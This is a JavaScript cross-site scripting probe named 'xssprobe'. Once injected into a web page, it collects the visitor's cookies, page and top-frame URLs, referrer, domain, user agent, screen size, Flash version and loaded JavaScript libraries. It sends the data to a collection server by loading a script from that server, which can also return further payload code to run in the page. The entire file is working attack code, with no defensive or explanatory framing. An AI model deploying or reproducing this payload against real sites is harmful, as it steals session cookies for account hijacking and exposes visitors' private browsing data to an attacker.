/*
xssprobe
by evilcos@gmail.com | @xeyeteam

*/

JSON = JSON || {};

if (typeof JSON.stringify !== 'function') {
    JSON.stringify = function(object) {
        var array = [];
        for (var i in object) {
            var s = object[i], v = (typeof s == 'object' && s != null) ? JSON.stringify(s) :
                (/^(string|number)$/.test(typeof s) ? "'" + s + "'" : s);
            array.push("'" + i + "':" + v);
        }
        return '{' + array.join(',') + '}';
    }
}

(function( _window, _document, _navigator, undefined ) {
    var BASE_URL = "http://localhost:3389/e/",
        NOT_AVAILABLE = "N/A",
        FOUND = "found",
        load = function(url) {
            //load payload
            var element = _document.createElement("script"),
                //flush cache and generate an new ID
                id = "_" + (+new Date * Math.random()).toString(36);
            element.setAttribute("src", url + "?&t=" + id);
            _document.body.appendChild(element);
        }, send = function(url) {
            new Image().src = url;
        };
    
    //load payloads
    load(BASE_URL + JSON.stringify({
        browser: (function() {
            ua = _navigator.userAgent.toLowerCase();
            var rwebkit = /(webkit)[ \/]([\w.]+)/,
                ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/,
                rmsie = /(msie) ([\w.]+)/,
                rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/,
                match = rwebkit.exec( ua ) ||
                    ropera.exec( ua ) ||
                    rmsie.exec( ua ) ||
                    ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
                    [];
            return {name: match[1] || NOT_AVAILABLE, ver: match[2] || NOT_AVAILABLE};
        })(),
        ua: escape(_navigator.userAgent),
        lang: _navigator.language,
        referrer: _document.referrer,
        location: _window.location.href,
        topLocation: top.location.href,
        cookie: escape(_document.cookie),
        domain: _document.domain,
        title: _document.title,
        screen: (function() {
            var scr = screen || {
                width: NOT_AVAILABLE,
                height: NOT_AVAILABLE,
                colorDepth: NOT_AVAILABLE
            };
            return scr ? [scr.width, "x", scr.height, ",", scr.colorDepth, "-bit"].join("") : "";
        })(),        
        flash: (function(_navigator) {
            var plug, len, //保存plugins和length
                 matches; //保存正则表达式的匹配项目
            if((plug = _navigator.plugins) && (len = plug.length)) {
                for (var i=0; i<len; i++) 
                    if (matches = plug[i].description.match(/Shockwave Flash ([\d\.]+) \w*/))
                        return matches[1];
            } else {
                return (new ActiveXObject("ShockwaveFlash.ShockwaveFlash")).GetVariable("$version")
                    .replace(/^.*\s+(\d+)\,(\d+).*$/, "$1.$2");
            }
        })(_navigator),
        //常见前端js框架和版本的探测
        lib: {
            jQuery: _window.jQuery ? jQuery().jquery : NOT_AVAILABLE,
            Zepto: _window.Zepto ? FOUND : NOT_AVAILABLE,
            Ext: _window.Ext && Ext.versions ? Ext.versions.extjs : NOT_AVAILABLE,
            dojo: _window.dojo ? dojo.version : NOT_AVAILABLE,
            Prototype : _window.Prototype ? Prototype.Version : NOT_AVAILABLE,
            YUI: typeof _window.YUI == "function" ? YUI().version : NOT_AVAILABLE
        }
    }));
})( window, document, navigator );